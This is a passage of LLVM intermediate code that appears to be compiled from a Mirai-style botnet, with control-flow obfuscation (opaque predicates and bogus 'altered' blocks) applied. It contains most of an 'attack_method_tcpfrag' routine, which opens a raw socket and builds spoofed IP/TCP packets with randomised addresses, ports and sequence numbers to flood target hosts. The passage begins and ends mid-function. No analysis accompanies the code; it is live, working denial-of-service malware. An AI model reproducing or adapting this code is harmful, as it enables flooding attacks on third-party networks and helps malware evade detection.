  %gen11 = add i32 %_10, 65535
  %_12 = sub i32 0, %556
  %gen13 = add i32 %_12, 65535
  %_14 = shl i32 %556, 65535
  %557 = and i32 %556, 65535
  %558 = trunc i32 %557 to i16
  %559 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %560 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %559, i32 0, i32 0
  store i16 %558, i16* %560, align 4
  br label %originalBB6

originalBB18alteredBB:                            ; preds = %originalBB18, %414
  %561 = call i32 @rand_next()
  %_19 = sub i32 0, %561
  %gen20 = add i32 %_19, 65535
  %_21 = shl i32 %561, 65535
  %_22 = sub i32 0, %561
  %gen23 = add i32 %_22, 65535
  %_24 = sub i32 0, %561
  %gen25 = add i32 %_24, 65535
  %562 = and i32 %561, 65535
  %563 = trunc i32 %562 to i16
  %564 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %565 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %564, i32 0, i32 1
  store i16 %563, i16* %565, align 2
  br label %originalBB18

originalBB29alteredBB:                            ; preds = %originalBB29, %436
  %566 = load i32, i32* %18, align 4
  %567 = icmp eq i32 %566, 65535
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %466
  %568 = load i8, i8* %20, align 1
  %569 = icmp ne i8 %568, 0
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %529
  %570 = load i32, i32* %9, align 4
  %_38 = sub i32 0, %570
  %gen39 = add i32 %_38, 1
  %_40 = shl i32 %570, 1
  %_41 = sub i32 0, %570
  %gen42 = add i32 %_41, 1
  %_43 = sub i32 %570, 1
  %gen44 = mul i32 %_43, 1
  %571 = add nsw i32 %570, 1
  store i32 %571, i32* %9, align 4
  br label %originalBB37
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpfrag(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 0)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %517

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %517

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %285, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %288

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = and i8 %133, 15
  %135 = or i8 %134, 64
  store i8 %135, i8* %132, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = and i8 %138, -16
  %140 = or i8 %139, 5
  store i8 %140, i8* %137, align 4
  %141 = load i8, i8* %12, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = call zeroext i16 @htons(i16 zeroext 60) #7
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 2
  store i16 %144, i16* %146, align 2
  %147 = load i16, i16* %13, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %147) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 3
  store i16 %148, i16* %150, align 4
  %151 = load i8, i8* %14, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 5
  store i8 %151, i8* %153, align 4
  %154 = load i8, i8* %15, align 1
  %155 = icmp ne i8 %154, 0
  br i1 %155, label %156, label %160

; <label>:156:                                    ; preds = %113
  %157 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 4
  store i16 %157, i16* %159, align 2
  br label %160

; <label>:160:                                    ; preds = %156, %113
  %161 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 6
  store i8 6, i8* %162, align 1
  %163 = load i32, i32* %26, align 4
  %164 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 8
  store i32 %163, i32* %165, align 4
  %166 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %167 = load i32, i32* %9, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 1
  %171 = load i32, i32* %170, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 9
  store i32 %171, i32* %173, align 4
  %174 = load i16, i16* %16, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  store i16 %175, i16* %177, align 4
  %178 = load i16, i16* %17, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 1
  store i16 %179, i16* %181, align 2
  %182 = load i32, i32* %18, align 4
  %183 = trunc i32 %182 to i16
  %184 = call zeroext i16 @htons(i16 zeroext %183) #7
  %185 = zext i16 %184 to i32
  %186 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 2
  store i32 %185, i32* %187, align 4
  %188 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 4
  %190 = load i16, i16* %189, align 4
  %191 = and i16 %190, -241
  %192 = or i16 %191, 160
  store i16 %192, i16* %189, align 4
  %193 = load i8, i8* %20, align 1
  %194 = sext i8 %193 to i16
  %195 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %196 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %195, i32 0, i32 4
  %197 = load i16, i16* %196, align 4
  %198 = and i16 %194, 1
  %199 = shl i16 %198, 13
  %200 = and i16 %197, -8193
  %201 = or i16 %200, %199
  store i16 %201, i16* %196, align 4
  %202 = load i8, i8* %21, align 1
  %203 = sext i8 %202 to i16
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %203, 1
  %208 = shl i16 %207, 12
  %209 = and i16 %206, -4097
  %210 = or i16 %209, %208
  store i16 %210, i16* %205, align 4
  %211 = load i8, i8* %22, align 1
  %212 = sext i8 %211 to i16
  %213 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %212, 1
  %217 = shl i16 %216, 11
  %218 = and i16 %215, -2049
  %219 = or i16 %218, %217
  store i16 %219, i16* %214, align 4
  %220 = load i8, i8* %23, align 1
  %221 = sext i8 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %221, 1
  %226 = shl i16 %225, 10
  %227 = and i16 %224, -1025
  %228 = or i16 %227, %226
  store i16 %228, i16* %223, align 4
  %229 = load i8, i8* %24, align 1
  %230 = sext i8 %229 to i16
  %231 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %230, 1
  %235 = shl i16 %234, 9
  %236 = and i16 %233, -513
  %237 = or i16 %236, %235
  store i16 %237, i16* %232, align 4
  %238 = load i8, i8* %25, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %239, 1
  %244 = shl i16 %243, 8
  %245 = and i16 %242, -257
  %246 = or i16 %245, %244
  store i16 %246, i16* %241, align 4
  %247 = load i8*, i8** %29, align 8
  %248 = getelementptr inbounds i8, i8* %247, i32 1
  store i8* %248, i8** %29, align 8
  store i8 2, i8* %247, align 1
  %249 = load i8*, i8** %29, align 8
  %250 = getelementptr inbounds i8, i8* %249, i32 1
  store i8* %250, i8** %29, align 8
  store i8 4, i8* %249, align 1
  %251 = call i32 @rand_next()
  %252 = and i32 %251, 15
  %253 = add i32 1400, %252
  %254 = trunc i32 %253 to i16
  %255 = call zeroext i16 @htons(i16 zeroext %254) #7
  %256 = load i8*, i8** %29, align 8
  %257 = bitcast i8* %256 to i16*
  store i16 %255, i16* %257, align 2
  %258 = load i8*, i8** %29, align 8
  %259 = getelementptr inbounds i8, i8* %258, i64 2
  store i8* %259, i8** %29, align 8
  %260 = load i8*, i8** %29, align 8
  %261 = getelementptr inbounds i8, i8* %260, i32 1
  store i8* %261, i8** %29, align 8
  store i8 4, i8* %260, align 1
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i32 1
  store i8* %263, i8** %29, align 8
  store i8 2, i8* %262, align 1
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 8, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 10, i8* %266, align 1
  %268 = call i32 @rand_next()
  %269 = load i8*, i8** %29, align 8
  %270 = bitcast i8* %269 to i32*
  store i32 %268, i32* %270, align 4
  %271 = load i8*, i8** %29, align 8
  %272 = getelementptr inbounds i8, i8* %271, i64 4
  store i8* %272, i8** %29, align 8
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 0, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = getelementptr inbounds i8, i8* %277, i32 1
  store i8* %278, i8** %29, align 8
  store i8 1, i8* %277, align 1
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %29, align 8
  store i8 3, i8* %279, align 1
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 3, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 6, i8* %283, align 1
  br label %285

; <label>:285:                                    ; preds = %160
  %286 = load i32, i32* %9, align 4
  %287 = add nsw i32 %286, 1
  store i32 %287, i32* %9, align 4
  br label %108

; <label>:288:                                    ; preds = %108
  br label %289

; <label>:289:                                    ; preds = %516, %288
  store i32 0, i32* %9, align 4
  br label %290

; <label>:290:                                    ; preds = %originalBBpart222, %289
  %291 = load i32, i32* %9, align 4
  %292 = load i8, i8* %5, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp slt i32 %291, %293
  br i1 %294, label %295, label %516

; <label>:295:                                    ; preds = %290
  %296 = load i32, i32* @x.49
  %297 = load i32, i32* @y.50
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %295
  %304 = load i8**, i8*** %11, align 8
  %305 = load i32, i32* %9, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds i8*, i8** %304, i64 %306
  %308 = load i8*, i8** %307, align 8
  store i8* %308, i8** %30, align 8
  %309 = load i8*, i8** %30, align 8
  %310 = bitcast i8* %309 to %struct.iphdr*
  store %struct.iphdr* %310, %struct.iphdr** %31, align 8
  %311 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i64 1
  %313 = bitcast %struct.iphdr* %312 to %struct.tcphdr*
  store %struct.tcphdr* %313, %struct.tcphdr** %32, align 8
  %314 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %315 = load i32, i32* %9, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i64 %316
  %318 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i32 0, i32 2
  %319 = load i8, i8* %318, align 4
  %320 = zext i8 %319 to i32
  %321 = icmp slt i32 %320, 32
  %322 = load i32, i32* @x.49
  %323 = load i32, i32* @y.50
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %321, label %330, label %351

; <label>:330:                                    ; preds = %originalBBpart2
  %331 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %332 = load i32, i32* %9, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %331, i64 %333
  %335 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %334, i32 0, i32 1
  %336 = load i32, i32* %335, align 4
  %337 = call i32 @ntohl(i32 %336) #7
  %338 = call i32 @rand_next()
  %339 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %340 = load i32, i32* %9, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %339, i64 %341
  %343 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %342, i32 0, i32 2
  %344 = load i8, i8* %343, align 4
  %345 = zext i8 %344 to i32
  %346 = lshr i32 %338, %345
  %347 = add i32 %337, %346
  %348 = call i32 @htonl(i32 %347) #7
  %349 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 9
  store i32 %348, i32* %350, align 4
  br label %351

; <label>:351:                                    ; preds = %330, %originalBBpart2
  %352 = load i32, i32* @x.49
  %353 = load i32, i32* @y.50
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %351
  %360 = load i32, i32* %26, align 4
  %361 = icmp eq i32 %360, -1
  %362 = load i32, i32* @x.49
  %363 = load i32, i32* @y.50
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %361, label %370, label %374

; <label>:370:                                    ; preds = %originalBBpart24
  %371 = call i32 @rand_next()
  %372 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %373 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %372, i32 0, i32 8
  store i32 %371, i32* %373, align 4
  br label %374

; <label>:374:                                    ; preds = %370, %originalBBpart24
  %375 = load i16, i16* %13, align 2
  %376 = zext i16 %375 to i32
  %377 = icmp eq i32 %376, 65535
  br i1 %377, label %378, label %384

; <label>:378:                                    ; preds = %374
  %379 = call i32 @rand_next()
  %380 = and i32 %379, 65535
  %381 = trunc i32 %380 to i16
  %382 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 3
  store i16 %381, i16* %383, align 4
  br label %384

; <label>:384:                                    ; preds = %378, %374
  %385 = load i16, i16* %16, align 2
  %386 = zext i16 %385 to i32
  %387 = icmp eq i32 %386, 65535
  br i1 %387, label %388, label %394

; <label>:388:                                    ; preds = %384
  %389 = call i32 @rand_next()
  %390 = and i32 %389, 65535
  %391 = trunc i32 %390 to i16
  %392 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 0
  store i16 %391, i16* %393, align 4
  br label %394

; <label>:394:                                    ; preds = %388, %384
  %395 = load i16, i16* %17, align 2
  %396 = zext i16 %395 to i32
  %397 = icmp eq i32 %396, 65535
  br i1 %397, label %398, label %420

; <label>:398:                                    ; preds = %394
  %399 = load i32, i32* @x.49
  %400 = load i32, i32* @y.50
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %398
  %407 = call i32 @rand_next()
  %408 = and i32 %407, 65535
  %409 = trunc i32 %408 to i16
  %410 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 1
  store i16 %409, i16* %411, align 2
  %412 = load i32, i32* @x.49
  %413 = load i32, i32* @y.50
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart211, label %originalBB6alteredBB

originalBBpart211:                                ; preds = %originalBB6
  br label %420

; <label>:420:                                    ; preds = %originalBBpart211, %394
  %421 = load i32, i32* %18, align 4
  %422 = icmp eq i32 %421, 65535
  br i1 %422, label %423, label %443

; <label>:423:                                    ; preds = %420
  %424 = load i32, i32* @x.49
  %425 = load i32, i32* @y.50
  %426 = sub i32 %424, 1
  %427 = mul i32 %424, %426
  %428 = urem i32 %427, 2
  %429 = icmp eq i32 %428, 0
  %430 = icmp slt i32 %425, 10
  %431 = or i1 %429, %430
  br i1 %431, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %423
  %432 = call i32 @rand_next()
  %433 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %434 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %433, i32 0, i32 2
  store i32 %432, i32* %434, align 4
  %435 = load i32, i32* @x.49
  %436 = load i32, i32* @y.50
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br label %443

; <label>:443:                                    ; preds = %originalBBpart215, %420
  %444 = load i32, i32* %19, align 4
  %445 = icmp eq i32 %444, 65535
  br i1 %445, label %446, label %450

; <label>:446:                                    ; preds = %443
  %447 = call i32 @rand_next()
  %448 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %449 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %448, i32 0, i32 3
  store i32 %447, i32* %449, align 4
  br label %450

; <label>:450:                                    ; preds = %446, %443
  %451 = load i8, i8* %20, align 1
  %452 = icmp ne i8 %451, 0
  br i1 %452, label %453, label %459

; <label>:453:                                    ; preds = %450
  %454 = call i32 @rand_next()
  %455 = and i32 %454, 65535
  %456 = trunc i32 %455 to i16
  %457 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %458 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %457, i32 0, i32 7
  store i16 %456, i16* %458, align 2
  br label %459

; <label>:459:                                    ; preds = %453, %450
  %460 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %461 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %460, i32 0, i32 7
  store i16 0, i16* %461, align 2
  %462 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %463 = bitcast %struct.iphdr* %462 to i16*
  %464 = call zeroext i16 @checksum_generic(i16* %463, i32 20)
  %465 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %466 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %465, i32 0, i32 7
  store i16 %464, i16* %466, align 2
  %467 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %468 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %467, i32 0, i32 6
  store i16 0, i16* %468, align 4
  %469 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %470 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %471 = bitcast %struct.tcphdr* %470 to i8*
  %472 = call zeroext i16 @htons(i16 zeroext 40) #7
  %473 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %469, i8* %471, i16 zeroext %472, i32 40)
  %474 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 6
  store i16 %473, i16* %475, align 4
  %476 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %477 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %476, i32 0, i32 1
